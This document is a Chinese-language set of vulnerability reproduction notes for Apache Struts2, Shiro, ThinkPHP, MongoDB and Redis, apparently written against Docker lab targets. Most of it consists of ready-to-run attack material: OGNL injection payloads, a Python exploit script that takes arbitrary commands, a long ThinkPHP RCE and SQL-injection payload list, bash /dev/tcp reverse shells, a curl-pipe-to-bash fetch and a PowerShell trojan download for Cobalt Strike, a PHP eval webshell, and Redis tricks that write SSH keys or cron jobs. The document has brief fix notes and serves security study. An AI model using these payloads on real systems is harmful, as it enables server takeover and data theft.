
#### 漏洞简介

```php
	Apache Struts是美国阿帕奇（Apache）基金会的一个开源项目，是一套用于创建企业级Java Web应用的开源MVC框架，主要提供两个版本框架产品，Struts 1和Struts 2。 Apache Struts 2.0.0版本至2.5.20版本中存在代码执行漏洞。攻击者可借助特制的请求利用该漏洞执行代码。
```

#### 影响版本

```php
Apache Struts 2.0.0~2.5.20版本
```

#### 漏洞复现

![image-20220122173922905](image/image-20220122173922905.png)

##### 漏洞利用代码

```
%25%7b%23_memberAccess.allowPrivateAccess%3Dtrue%2C%23_memberAccess.allowStaticMethodAccess%3Dtrue%2C%23_memberAccess.excludedClasses%3D%23_memberAccess.acceptProperties%2C%23_memberAccess.excludedPackageNamePatterns%3D%23_memberAccess.acceptProperties%2C%23res%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23a%3D%40java.lang.Runtime%40getRuntime()%2C%23s%3Dnew%20java.util.Scanner(%23a.exec('ls%20-al').getInputStream()).useDelimiter('%5C%5C%5C%5CA')%2C%23str%3D%23s.hasNext()%3F%23s.next()%3A''%2C%23res.print(%23str)%2C%23res.close()%0A%7d
```

![image-20220122173935194](image/image-20220122173935194.png)

##### Python漏洞验证脚本

```python
import sys
import random
import requests
if len(sys.argv) != 2:
    print("[*]Usage：%s <target>" % sys.argv[0])
    sys.exit(0)
url = sys.argv[1]
if "://" not in url:
    url = "http://"
if "action" not in url:
    url = url + "/index.action"
random_string = ''.join(random.choice('123456789') for i in range(3))
data = {"skillName":random_string+random_string}
try:
    result = requests.post(url,data=data)
    if random_string+random_string in result.text and result.status_code==200:
        print(result.text)
        print("Vulnerable!")
    else:
        print("Not Affected.")
except Exception as e:
    print(e)
    pass
```

##### Python漏洞攻击脚本

```python
import sys
import requests

try:
    import requests.packages.urllib3
    requests.packages.urllib3.disable_warnings()
except:
    pass

def exploit(url,cmd):
    if "://" not in url:
        url = "http://" + url + "/index.action"

    payload = "skillName=%25%7b%23_memberAccess.allowPrivateAccess%3Dtrue%2C%23_memberAccess."
    payload += "allowStaticMethodAccess%3Dtrue%2C%23_memberAccess.excludedClasses%3D%23_memberAccess."
    payload += "acceptProperties%2C%23_memberAccess.excludedPackageNamePatterns%3D%23_memberAccess."
    payload += "acceptProperties%2C%23res%3D%40org.apache.struts2.ServletActionContext%40getResponse()."
    payload += "getWriter()%2C%23a%3D%40java.lang.Runtime%40getRuntime()%2C%23s%3Dnew%20java.util."
    payload += "Scanner(%23a.exec('" + str(cmd) + "').getInputStream()).useDelimiter('%5C%5C%5C%5CA')%2C%23str%3D%23s."
    payload += "hasNext()%3F%23s.next()%3A''%2C%23res.print(%23str)%2C%23res.close()%0A%7d"
    header = {'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36',
              'Content-Type':'application/x-www-form-urlencoded'}

    try:
        response = requests.post(url,headers=header,data=payload,allow_redirects=False,verify=False)
        if response.status_code == 200:
            print(response.text)
    except Exception as e:
        print(e)
        pass

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print("[*]Usage：%s <target> <cmd>" % sys.argv[0])
        sys.exit(0)
    else:
        exploit(sys.argv[1],sys.argv[2])
```

![image-20220122173954396](image/image-20220122173954396.png)

#### 漏洞修复

目前厂商已发布升级补丁以修复漏洞，补丁获取链接： https://cwiki.apache.org/confluence/display/ww/s2-059

------



### Struts2-061远程代码执行(CVE-2020-17530)

#### 漏洞简介

```php
Apache Struts2框架是一个用于开发Java EE网络应用程序的Web框架。据官方描述，如果开发人员在解析％{…}等标签时强制使用OGNL evaluation，则某些标签的属性可能会执行double evaluation，从而可能使不受信任的用户输入导致远程代码执行等安全风险
```

#### 影响版本

```php
Apache Struts 2.0.0 - Apache Struts 2.5.25
```

#### 漏洞复现

##### 漏洞利用代码

```
POST /index.action HTTP/1.1
Host: 192.168.0.1:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF
Content-Length: 833

------WebKitFormBoundaryl7d1B1aGsV2wcZwF
Content-Disposition: form-data; name="id"

%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("whoami")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}
------WebKitFormBoundaryl7d1B1aGsV2wcZwF--
```

[![image.png](https://camo.githubusercontent.com/2a338c3b6f8352da1faf0fcea7fe55ed760cbfa29d7ffa4b15701ab1acb6ace1/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032312f706e672f313636303038312f313633363632343337303232302d31363666313432642d613330392d346666332d613566312d6165653931356334306532622e706e6723636c69656e7449643d7533643333333238662d393365392d342663726f703d302663726f703d302663726f703d312663726f703d312666726f6d3d7061737465266865696768743d3236382669643d756165306137313966266d617267696e3d2535426f626a6563742532304f626a656374253544266e616d653d696d6167652e706e67266f726967696e4865696768743d353336266f726967696e57696474683d31353632266f726967696e616c547970653d62696e61727926726174696f3d3126726f746174696f6e3d302673686f775469746c653d66616c73652673697a653d313335373137267374617475733d646f6e65267374796c653d6e6f6e65267461736b49643d7537623961373863382d343839312d343166632d383866662d6536623231373132343731267469746c653d2677696474683d373831)](https://camo.githubusercontent.com/2a338c3b6f8352da1faf0fcea7fe55ed760cbfa29d7ffa4b15701ab1acb6ace1/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032312f706e672f313636303038312f313633363632343337303232302d31363666313432642d613330392d346666332d613566312d6165653931356334306532622e706e6723636c69656e7449643d7533643333333238662d393365392d342663726f703d302663726f703d302663726f703d312663726f703d312666726f6d3d7061737465266865696768743d3236382669643d756165306137313966266d617267696e3d2535426f626a6563742532304f626a656374253544266e616d653d696d6167652e706e67266f726967696e4865696768743d353336266f726967696e57696474683d31353632266f726967696e616c547970653d62696e61727926726174696f3d3126726f746174696f6e3d302673686f775469746c653d66616c73652673697a653d313335373137267374617475733d646f6e65267374796c653d6e6f6e65267461736b49643d7537623961373863382d343839312d343166632d383866662d6536623231373132343731267469746c653d2677696474683d373831)



#### 漏洞修复

**建议升级Struts2到最新版本**





## Shiro漏洞复现

### CVE-2016-4437(Apache Shiro 反序列化漏洞)

#### 漏洞描述

```php
  Apache Shiro是一个Java安全框架，执行身份验证、授权、密码和会话管理。只要rememberMe的AES加密秘钥泄露，无论shiro是什么版本都会导致反序列化漏洞。
```

#### 漏洞原理

```php
Apache Shiro框架提供了记住我(RememberMe)的功能，关闭了浏览器下次再打开时还是能记住你是谁，下次访问时无需再登录即可访问。Shiro对rememberMe的cookie做了加密处理，shiro在CookieRememberMeManager类中将cookie中rememberMe字段内容分别进行序列化、AES加密、Base64编码操作。
```

#### 漏洞分析

```php
Apache Shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：得到rememberMe的cookie值 > Base64解码–>AES解密–>反序列化。然而AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。
```

#### 漏洞特征

```php
shiro反序列化的特征：在返回包的 Set-Cookie 中存在rememberMe=deleteMe 字段
```

#### 影响版本

```php
影响Shiro<1.2.5版本，当未设置用于“remember me” 特性的AES密钥时，存在反序列化漏洞，可远程命令执行。
```

#### 环境搭建

##### Linux环境

```php
##出网环境
sudo docker pull vulhub/shiro:1.2.4
sudo docker run -p 8081:8080 --name shiro -d vulhub/shiro:1.2.4
    
##不出网环境
docker pull medicean/vulapps:s_shiro_1
sudo docker run -d -p 8888:8080 -p 6666:6666 medicean/vulapps:s_shiro_1
```



##### Windows环境

（1）下载tomcat和shiro安装包

tomcat：https://links.jianshu.com/go?to=http%3A%2F%2Ftomcat.apache.org%2Fdownload-80.cgi

shiro：https://github.com/0day666/Software/blob/main/shiro-web-1.2.4.war

![image-20220122220348260](image/image-20220122220348260.png)

![image-20220122221954844](image/image-20220122221954844.png)

（2）将tomcat解压出来，然后将shiro包复制到tomcat/webapps目录下，并重命名为shiro.war

![image-20220122220906719](image/image-20220122220906719.png)

（3）使用cmd命令行进入到tomcat/bin目录中，输入如下命令安装tomcat服务：

```python
service.bat install
```

（4）安装完tomcat服务后，运行tomcat8.exe，shiro项目就完成部署了

```php
.\tomcat8.exe
```

![image-20220122221203275](image/image-20220122221203275.png)





#### 漏洞复现

##### Linux出网环境渗透Shiro反序列化漏洞

（1）访问目标站点

![image-20220122123102044](../漏洞复现/image/image-20220122123102044.png)

（2）burpsuite抓取登录数据包，抓包后将Cookie内容改为remember Me=1，若响应包有rememberMe=deleteMe，则基本可以确定网站是apache shiro搭建

![image-20220122123319040](../漏洞复现/image/image-20220122123319040.png)

![image-20220122123442497](../漏洞复现/image/image-20220122123442497.png)

（3）运行shiro_attack工具来爆破key值，成功利用获得的key来执行命令。

下载地址：https://github.com/j1anFen/shiro_attack/releases/download/2.2/shiro_attack_2.2.zip

![image-20220122124059575](../漏洞复现/image/image-20220122124059575.png)



##### Linux不出网环境渗透shiro反序列化漏洞

（1）访问目标站点主页，点击Login选项

![image-20220122124435291](../漏洞复现/image/image-20220122124435291.png)

（2）抓取登录数据包，将Cookie内容改为remember Me=1，若响应包有rememberMe=deleteMe，则基本可以确定网站是apache shiro搭建

![image-20220122124530448](../漏洞复现/image/image-20220122124530448.png)

![image-20220122124640258](../漏洞复现/image/image-20220122124640258-16428268010372.png)

（3）不出网攻击shiro，需要下载Python编写的shiro-1.2.4_rce脚本

下载地址：https://github.com/zhzyker/exphub/tree/master/shiro

![image-20220122125251788](../漏洞复现/image/image-20220122125251788.png)

（4）分析Python脚本，脚本中添加了判断逻辑，修改了源码的ysoserial-sleep.jar，主要对应延迟5的应用，然后去循环key和gadget，如果某个key和gadget组合以及延迟命令success生效了，就是存在的，还区别两个判断，linux和windows，最后在写入shell后还对发送命令进行了base64进行编译后发送！

![image-20220122125232172](../漏洞复现/image/image-20220122125232172.png)

（5）开始验证攻击

```php
python3 shiro-1.2.4_rce.py http://192.168.22.1:8888/login.jsp
```

![image-20220122125358685](../漏洞复现/image/image-20220122125358685.png)

成功找到了Key值，输入liinux获取shell，由于命令是自动编制执行的，无回显

![image-20220122125544970](../漏洞复现/image/image-20220122125544970.png)

（6）反弹Shell

```php
bash -c 'exec bash -i &>/dev/tcp/172.17.0.1/9999 <&1'
```

![image-20220122125822750](../漏洞复现/image/image-20220122125822750.png)



##### Windows环境渗透Shiro反序列化漏洞

（1）访问目标站点

```
http://192.168.127.147:8080/shiro/login.jsp
```

![image-20220122222141199](image/image-20220122222141199.png)

（2）Python脚本自动化攻击shiro

```php
python3 shiro-1.2.4_rce.py http://192.168.127.147:8080/shiro/
```

![image-20220122223338588](image/image-20220122223338588.png)

（3）上线CS

* 创建监听器

![image-20220122223542198](image/image-20220122223542198.png)

* 生成木马

![image-20220122223606138](image/image-20220122223606138.png)

* 在木马存放目录下用python3开启简易版http服务器

![image-20220122223845175](image/image-20220122223845175.png)

* powershell上线CS

```php
powershell (new-object System.Net.WebClient).DownloadFile('http://192.168.127.1:8000/muma.exe','muma.exe');start-process muma.exe
```

![image-20220122224033794](image/image-20220122224033794.png)





------

### CVE-2020-11989：Apache Shiro权限绕过复现

#### 漏洞简述

```php
	Apache Shiro 1.5.2之前版本中存在安全漏洞。攻击者可借助特制的请求利用该漏洞绕过身份验证。
	Shiro框架通过拦截器功能来对用户访问权限进行控制，如anon, authc等拦截器。anon为匿名拦截器，不需要登录即可访问；authc为登录拦截器，需要登录才可以访问。Shiro的URL路径表达式为Ant格式，路径通配符*表示匹配零个或多个字符串，/可以匹配/hello，但是匹配不到/hello/，因为通配符无法匹配路径。假设/hello接口设置了authc拦截器，访问/hello会进行权限判断，但如果访问的是/hello/，那么将无法正确匹配URL，直接放行，进入到spring拦截器。spring中的/hello和/hello/形式的URL访问的资源是一样的，从而实现了权限绕过。
```

#### 影响版本

```php
Apache Shiro < 1.5.2
```

#### 漏洞拦截器

```phhp
Shiro框架通过拦截器功能来实现对用户访问权限的控制和拦截。Shiro中常见的拦截器有anon,authc等拦截器。

1.anon为匿名拦截器，不需要登录就能访问，一般用于静态资源，或者移动端接口。
2.authc为登录拦截器，需要登录认证才能访问的资源。
用户可以在Shiro.ini编写匹配URL配置，将会拦截匹配的URL，并执行响应的拦截器。从而实现对URL的访问控制，URL路径表达式通常为ANT格式。如下配置，访问 /index.html主页的时候，Shiro将不会对其进行登录判断，anon拦截器不需要登录就能进行访问。而对于/user/xiaoming 等 /user/xiaogang等接口，authc拦截器将会对其进行登录判断，有登录认证才能访问资源。
[urls] /index.html = anon /user/** = authc
Shiro的URL路径表达式为Ant 格式，路径通配符支持 ?  。
?：匹配一个字符 ：匹配零个或多个字符串 **：匹配路径中的零个或多个路径
其中表示匹配零个或多个字符串，/可以匹配/hello，但匹配不到/hello/因为通配符无法匹配路径。假设/hello接口设置了authc拦截器，访问/hello将会被进行权限判断，如果请求的URI为/hello/呢，/*URL路径表达式将无法正确匹配，放行。然后进入到spring(Servlet)拦截器，spring中/hello 形式和/hello/形式的URL访问的资源是一样的。
```

#### 环境搭建

```php
docker pull vulfocus/shiro-cve_2020_1957
sudo docker run -p 8082:8080 --name hiro-cve_2020_1957 -d vulfocus/shiro-cve_2020_1957
```

#### 漏洞复现

（1）访问靶机http://ip:8082

![image-20220122131331870](image/image-20220122131331870.png)

（2）Shiro1.4.2版本绕过权限

访问`/hello/1`接口，可以看到被authc拦截器拦截了，将会跳转到登录接口进行登录：

![image-20220122131440719](image/image-20220122131440719.png)

访问`/hello/1/`，成功绕过authc拦截器，获取到了资源

![image-20220122131505149](image/image-20220122131505149.png)

（3）Shiro≤1.5.1版本绕过

在1.5.1版本中，/hello/会直接跳转到登录！

绕过payload：`/dwdww;/../hello/1`，成功绕过

或者其他payload：`xxxx/..;/hello/1`，成功绕过（shiro的1.5.1及其之前的版本都可以）

#### 漏洞总结

```php
CVE-2020-13933虽然是CVE-2020-11989的绕过，然而两者的绕过内容却不同！
CVE-2020-11989针对于/admin/page，这种固定路由，shiro得到的地址为/，因此认为可以访问，Spring得到的地址为/admin/page，从而定位到未授权的页面！
CVE-2020-13933则是匹配非固定地址路由，比如/admin/{name}，因为shiro得到的是/admin/，认为可以访问，而Spring得到的是/admin/;page，如果也采取固定路由，则会因为找不到;page，从而返回404！
```



------

### Apache Shiro 认证绕过漏洞（CVE-2020-1957）

#### 漏洞简介

```php
Apache Shiro是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。
在Apache Shiro 1.5.2以前的版本中，在使用Spring动态控制器时，攻击者通过构造..;这样的跳转，可以绕过Shiro中对目录的权限限制。
```

#### 影响版本

```php
Apache Shiro < 1.5.3
```

#### 环境搭建

```php
docker pull vulfocus/shiro-cve_2020_1957
sudo docker run -p 8082:8080 --name hiro-cve_2020_1957 -d vulfocus/shiro-cve_2020_1957
```

#### 漏洞复现

复现过程与和CVE-2020-11989一样



------

### 漏洞总结

shiro的功能用到了AES加密，但是密钥是硬编码在代码里的，所以很容易拿到密钥，因为 AES 是对称加密，即加密密钥也同样是解密密钥，所以就可以通过恶意构建Cookie获取权限执行攻击命令，拿到root权限，官方解决的方案是简单的弃用了问题代码。

官方解释链接：

```
https://github.com/Collaborne/shiro/commit/71114398cadb47e49384638df0a4b79fb3120f8a
```

所以建议是升级shiro版本，避免该问题，新版本到shiro 1.2.5及以上版本，就不存在硬编码密钥的问题，而改为自定义密钥，但是我看了一下我使用的shiro版本是1.4.0，按理不应该存在该问题了啊，那问题出在哪里呢，片头引用的第四篇文章里面说到了升级shiro版本后仍然存在反序列化漏洞，其原因是因为我们使用了别人的开源框架，他们在代码里会配置shiro的密钥，而关键代码可以在github上通过api search接口搜索到，从而得到一个所谓的key包，其实就是这些密钥的集合，然后用这些公开的密钥去轮流尝试，如果你用了开源的框架，而没有修改shiro的密钥，其实这就相当于你使用的shiro密钥已经泄露，这是非常危险的。







## Thinkphp漏洞复现

```php
	ThinkPHP是一个快速、兼容而且简单的轻量级国产PHP开发框架，诞生于2006年初，原名FCS，2007年元旦正式更名为ThinkPHP，遵循Apache2开源协议发布，从Struts结构移植过来并做了改进和完善，同时也借鉴了国外很多优秀的框架和模式，使用面向对象的开发结构和MVC模式，融合了Struts的思想和TagLib（标签库）、RoR的ORM映射和ActiveRecord模式。
	ThinkPHP可在Windows和Linux等操作系统运行，支持MySql，Sqlite和PostgreSQL等多种数据库以及PDO扩展，是一款跨平台，跨版本以及简单易用的PHP框架。
```

### ThinkPHP 2.x 任意代码执行漏洞

#### 漏洞简述

```
ThinkPHP 2.x版本中，使用preg_replace的/e模式匹配路由：

$res = preg_replace('@(\w+)'.$depr.'([^'.$depr.'\/]+)@e', '$var[\'\\1\']="\\2";', implode($depr,$paths));

导致用户的输入参数被插入`双引号`中执行，造成任意代码执行漏洞。
ThinkPHP 3.0版本因为Lite模式下没有修复该漏洞，也存在这个漏洞。
```

#### 影响版本

```php
ThinkPHP 2.x
```

#### 环境搭建

```php
docker pull vulhub/thinkphp:2.1
sudo docker run -p 8087:80 --name thinkphp:2.1 -d vulhub/thinkphp:2.1
```

#### 漏洞复现

（1）访问`http://your-ip:8087/`即可查看到默认页面

![image-20220122160111983](image/image-20220122160111983.png)

（2）构造Payload`http://your-ip:8087/index.php?s=/index/index/name/$%7B@phpinfo()%7D`即可执行`phpinfo()`：

```php
http://192.168.22.1:8087/index.php?s=/index/index/name/$%7B@phpinfo()%7D
```

![image-20220122160126192](image/image-20220122160126192.png)

（3）构造执行系统命令Payload

```php
http://192.168.22.1:8087/index.php?s=a/b/c/${@print(eval($_GET[1]))}&1=system('whoami');
```

![image-20220122160353948](image/image-20220122160353948.png)





------

### Thinkphp5-5.0.22 / 5.1.29远程执行代码漏洞

#### 漏洞简述

```php
	ThinkPHP是在中国使用极为广泛的PHP开发框架。在其版本5中，由于框架错误地处理了控制器名称，因此如果网站未启用强制路由（默认设置），则该框架可以执行任何方法，从而导致RCE漏洞。
	2018年12月10日中午，thinkphp官方公众号发布了一个更新通知，包含了一个5.x系列所有版本存在被getshell的高风险漏洞。
```

#### 影响版本

```php
Thinkphp  5.0.22 / 5.1.29
```

#### 环境搭建

```php
docker pull vulhub/thinkphp:5.0.20
sudo docker run -p 8080:80 --name thinkphp5.0.20 -d vulhub/thinkphp:5.0.20
```

（1）访问目标站点

![image-20220122154135403](image/image-20220122154135403.png)

（2）验证是否存在漏洞

Payload：

```php
thinkphp 5.0.22
1、http://192.168.1.1/thinkphp/public/?s=.|think\config/get&name=database.username
2、http://192.168.1.1/thinkphp/public/?s=.|think\config/get&name=database.password
3、http://url/to/thinkphp_5.0.22/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
4、http://url/to/thinkphp_5.0.22/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1

thinkphp 5
5、http://127.0.0.1/tp5/public/?s=index/\think\View/display&content=%22%3C?%3E%3C?php%20phpinfo();?%3E&data=1

thinkphp 5.0.21
6、http://localhost/thinkphp_5.0.21/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
7、http://localhost/thinkphp_5.0.21/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1

thinkphp 5.1.*
8、http://url/to/thinkphp5.1.29/?s=index/\think\Request/input&filter=phpinfo&data=1
9、http://url/to/thinkphp5.1.29/?s=index/\think\Request/input&filter=system&data=cmd
10、http://url/to/thinkphp5.1.29/?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=%3C?php%20phpinfo();?%3E
11、http://url/to/thinkphp5.1.29/?s=index/\think\view\driver\Php/display&content=%3C?php%20phpinfo();?%3E
12、http://url/to/thinkphp5.1.29/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
13、http://url/to/thinkphp5.1.29/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd
14、http://url/to/thinkphp5.1.29/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
15、http://url/to/thinkphp5.1.29/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd

未知版本
16、?s=index/\think\module/action/param1/${@phpinfo()}
17、?s=index/\think\Module/Action/Param/${@phpinfo()}
18、?s=index/\think/module/aciton/param1/${@print(THINK_VERSION)}
19、index.php?s=/home/article/view_recent/name/1'
header = "X-Forwarded-For:1') and extractvalue(1, concat(0x5c,(select md5(233))))#"
20、index.php?s=/home/shopcart/getPricetotal/tag/1%27
21、index.php?s=/home/shopcart/getpriceNum/id/1%27
22、index.php?s=/home/user/cut/id/1%27
23、index.php?s=/home/service/index/id/1%27
24、index.php?s=/home/pay/chongzhi/orderid/1%27
25、index.php?s=/home/pay/index/orderid/1%27
26、index.php?s=/home/order/complete/id/1%27
27、index.php?s=/home/order/complete/id/1%27
28、index.php?s=/home/order/detail/id/1%27
29、index.php?s=/home/order/cancel/id/1%27
30、index.php?s=/home/pay/index/orderid/1%27)%20UNION%20ALL%20SELECT%20md5(233)--+
31、POST /index.php?s=/home/user/checkcode/ HTTP/1.1
Content-Disposition: form-data; name="couponid"
1') union select sleep('''+str(sleep_time)+''')#

thinkphp 5.0.23（完整版）debug模式
32、(post)public/index.php (data)_method=__construct&filter[]=system&server[REQUEST_METHOD]=touch%20/tmp/xxx

thinkphp 5.0.23(完整版)
33、（post）public/index.php?s=captcha (data) _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=ls -al

thhinkphp 5.0.10（完整版）
34、(post)public/index.php?s=index/index/index (data)s=whoami&_method=__construct&method&filter[]=system
```

使用如下Payload成功执行命令

```php
http://192.168.22.1:8085/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars\[0\]=system&vars\[1\][]=id
```

![image-20220122154350321](image/image-20220122154350321.png)





------

### ThinkPHP5 5.0.23远程执行代码漏洞

#### 漏洞简述

```php
  ThinkPHP是在中国使用极为广泛的PHP开发框架。在其版本5.0（<5.0.24）中，框架在获取请求方法时会错误地对其进行处理，就是在获取method的方法中没有正确处理方法名，这使攻击者可以调用Request类的任何方法，攻击者可以调用Request类任意方法并构造利用链，从而导致远程代码执行漏洞。
```

#### 影响版本

```php
Thinkphp 5.0.0~ 5.0.23
```

#### 环境搭建

```php
docker pull vulhub/thinkphp:5.0.23
sudo docker run -p 8080:80 --name thinkphp -d vulhub/thinkphp:5.0.23
```

#### 漏洞复现

（1）访问目标站点

![image-20220122152725906](image/image-20220122152725906.png)

（2）验证漏洞是否存在

```php
curl "http://172.17.0.5/index.php?s=captcha" -X POST -d "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=whoami"
```

![image-20220122153047684](image/image-20220122153047684.png)

（3）反弹shell

本地主机上新建一个shell.sh脚本，内容如下：

```php
bash -c 'exec bash -i &>/dev/tcp/172.17.0.1/8787 <&1'
```

运行nc监听8787端口

```
nc -lvp 8787
```

用Python3开启一个简易版的HTTP服务器

```
python3 -m http.server 8000
```

发送如下Payload反弹Shell

```
curl "http://172.17.0.5/index.php?s=captcha" -X POST -d "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=curl http://172.17.0.1:8000/shell.sh|bash"
```

![image-20220122153607934](image/image-20220122153607934.png)





------

### ThinkPHP5 SQL注入漏洞和敏感信息泄露漏洞

#### 漏洞简介

```php
	传入的某参数在绑定编译指令的时候又没有安全处理，预编译的时候导致SQL异常报错。然而thinkphp5默认开启debug模式，在漏洞环境下构造错误的SQL语法会泄漏数据库账户和密码。
```

#### 影响版本

```php
ThinkPHP < 5.1.23
```

#### 环境搭建

```php
docker pull vulhub/thinkphp:5.0.9
sudo docker run -p 80:80 --name thinkphp5.0.9 -d vulhub/thinkphp:5.0.9
```

#### 漏洞复现

（1）访问目标站点

```php
http://192.168.22.1/index.php
```

![image-20220122152725906](image/image-20220122152725906.png)

（2）访问以下URL，如果看到显示用户名，说明漏洞可能存在

```php
http://192.168.22.1/index.php?ids[]=1&ids[]=2
```

![image-20220122155028945](image/image-20220122155028945.png)

（3）构造POC获取数据用户名密码

```php
http://192.168.22.1/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1
```

![image-20220122155459479](image/image-20220122155459479.png)





# 数据库漏洞复现

## Mongodb漏洞复现

### Mongodb未授权访问

#### 漏洞简介

```php
  对外开放的MongoDB服务，未配置访问认证授权，无需认证连接数据库后对数据库进行任意操作（增、删、改、查高危动作），存在严重的数据泄露风险
```

#### 漏洞成因

```php
3.0之前版本的MongoDB,默认监听在0.0.0.0，3.0及之后版本默认监听在127.0.0.1。
3.0之前版本，如未添加用户管理员账号及数据库账号，使用--auth参数启动时，在本地通过127.0.0.1仍可无需账号密码登陆访问数据库，远程访问则提示需认证；
3.0及之后版本，使用--auth参数启动后，无账号则本地和远程均无任何数据库访问权
```

#### 环境搭建

```php
sudo docker pull mongo
docker run -d -p 27017:27017 --name mongodb mongo
```

#### 漏洞复现

##### MSF漏洞验证

```
use auxiliary/scanner/mongodb/mongodb_login
set rhosts 172.17.0.2
exploit
```

![image-20220123095038090](image/image-20220123095038090.png)

用图形化工具连接mongodb

![image-20220123095826550](image/image-20220123095826550.png)

#### 漏洞修复

**1、修改默认端口**
修改默认的mongoDB端口(默认为: TCP 27017)为其他端口
**2、不要开放服务到公网**

```
vim /etc/mongodb.conf
bind_ip = 127.0.0.1
```

**3、禁用HTTP和REST端口**
**4、为MongoDB添加认证**
MongoDB启动时添加`--auth`参数、为MongoDB添加用户



## redis漏洞复现

```php
  REmote DIctionary Server(Redis) 是一个由Salvatore Sanfilippo写的key-value存储系统。
  Redis是一个开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。它通常被称为数据结构服务器，因为值（value）可以是字符串(String), 哈希(Map), 列表(list), 集合(sets) 和有序集合(sorted sets)等类型。从2010年3月15日起，Redis的开发工作由VMware主持。从2013年5月开始，Redis的开发由Pivotal赞助。目前最新稳定版本为4.0.8。
  Redis 是一个开源的高性能键值数据库。最热门的 NoSql 数据库之一，也被人们称为数据结构服务器。
```

### Redis未授权访问

#### 漏洞简介

```php
  Redis在大公司被大量应用，通过笔者的研究发现，目前在互联网上已经出现Redis未经授权病毒似自动攻击，攻击成功后会对内网进行扫描、控制、感染以及用来进行挖矿、勒索等恶意行为，早期网上曾经分析过一篇文章“通过redis感染linux版本勒索病毒的服务器”（http://www.sohu.com/a/143409075_765820），如果公司使用了Redis，那么应当给予重视，通过实际研究，当在一定条件下，攻击者可以获取webshell，甚至root权限。
```

#### 影响版本

```
redis全版本
```

#### 实验环境

```php
靶机：Centos7(192.168.0.1)，redis版本为2.8.17
攻击机：kali Linux(192.168.0.138)
```

#### 环境搭建

```php
cd /tmp
wget http://download.redis.io/releases/redis-2.8.17.tar.gz
tar xzf redis-2.8.17.tar.gz
cd redis-2.8.17
make
#启动redis服务
/tmp/redis-2.8.17/src/redis.server /tmp/redis-2.8.17/redis.conf
```

#### 漏洞复现

##### 方法一：利用redis写webshell

**利用条件：**

- 在攻击机上能用redis-cli无密码成功连接
- 目标机开启WEB服务，具有web目录下的写权限和网站绝对路径

**写入一个shell.php文件到网站根目录下**

```php
redis-cli -h 192.168.0.1
config set dir /var/www/html/
config set dbfilename shell.php
set shell "\r\n\r\n<?php phpinfo();?>\r\n\r\n"
save
```

![image-20220122235212749](image/image-20220122235212749.png)

**成功访问shell.php**

![image-20220122235253105](image/image-20220122235253105.png)

**当数据库过大时，redis写shell的小技巧：**

```php
<?php 
set_time_limit(0);
$fp=fopen('wtf.php','w');
fwrite($fp,'<?php @eval($_POST[\"mmbns233\"]);?>');
exit();
?>
```



##### 方法二：利用redis写入ssh公钥实现免密登录

**利用条件：**

- 目标主机开启ssh服务
- 目标主机/root/.ssh/目录存在
- 目标主机redis服务以root权限启动，允许写入公钥到/root/.ssh/目录下

**在本地生成ssh密钥对**

```php
cd /root/.ssh
ssh-keygen
(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > pub.txt
```

![image-20220122235352125](image/image-20220122235352125.png)

**连接 Redis写入公钥**

```
cat pub.txt | ./redis-cli -h 192.168.0.1  -x set pub
redis-cli -h 192.168.0.1
config set dir /root/.ssh/
config get dir
config set dbfilename "authorized_keys"
save
```

![image-20220122235427011](image/image-20220122235427011.png)

**免密登录到目标主机上**

```
ssh root@192.168.0.1
```

![image-20220122235440856](image/image-20220122235440856.png)



##### 方法三：利用crontab反弹Shell

**利用条件：**

- 目标主机redis服务以root权限启动，允许写入计划任务文件

**在本地启动nc监听8888端口**

```
nc -lvp 8888
```

![image-20220122235540528](image/image-20220122235540528.png)

**crontab任务计划文件文件路径** [linux](https://so.csdn.net/so/search?from=pc_blog_highlight&q=linux)通用路径：/etc/crontab

 ubuntu被编辑的文件路径一般为：/var/spool/cron/crontabs/当前用户 

centos被编辑的文件路径一般为：/var/spool/cron/当前用户 

